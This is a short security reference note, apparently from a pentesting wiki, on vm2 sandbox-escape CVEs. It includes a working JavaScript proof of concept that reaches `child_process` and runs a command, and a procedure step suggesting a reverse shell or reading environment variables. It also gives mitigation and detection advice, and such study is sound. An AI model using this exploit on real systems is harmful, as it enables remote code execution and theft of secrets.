---
topic: vm2 — JavaScript sandbox escape
tags: [web, nodejs, vm2, sandbox-escape, rce]
---

# vm2 — JavaScript sandbox escape

[🇪🇸 Español](vm2-sandbox-escape.md) | **English**

## Concept

vm2 tries to isolate untrusted JavaScript in a separate context. Several 2023 CVEs break that isolation from user code and reach `process`, `require` and `child_process`.

## When it applies

- An application runs user code with vm2.
- The version is 3.9.16 or earlier.
- The Node.js process has network access or secrets.

## Procedure

1. Confirm the version in `package.json` or a response.
2. Pick a PoC for CVE-2023-32314, 30547, 37466 or 37903.
3. Run `process.mainModule.require('child_process')`.
4. Start a reverse shell or read environment variables.

```javascript
const { VM } = require("vm2");
new VM().run('err = new Error(); err.name = { toString: new Proxy(() => "", { apply(target, thiz, args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync("id"); } }) }; err.stack;');
```

## Variants

- `Error.prepareStackTrace` to reach the host.
- `WebAssembly` or `Proxy` to cross the context.
- `require` of native modules to write files.

## Limitations

- The patched version blocks the PoC.
- A container without tooling limits post-exploitation.
- `--experimental-vm-modules` may change behavior.

## Mitigation

- Update vm2 or migrate to `isolated-vm`.
- Do not run user code in the main process.
- Apply seccomp, no network and no secrets to the sandbox.

## Detection

- Unexpected child processes of Node.js.
- `child_process` use from the playground service.
- Vulnerable versions in the inventory.

## References

- [Snyk — vm2 CVE-2023-32314](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100)
- [0xdf — Codify](https://0xdf.gitlab.io/2024/04/06/htb-codify.html)
- [vm2 — project shutdown](https://github.com/patriksimek/vm2/issues/533)
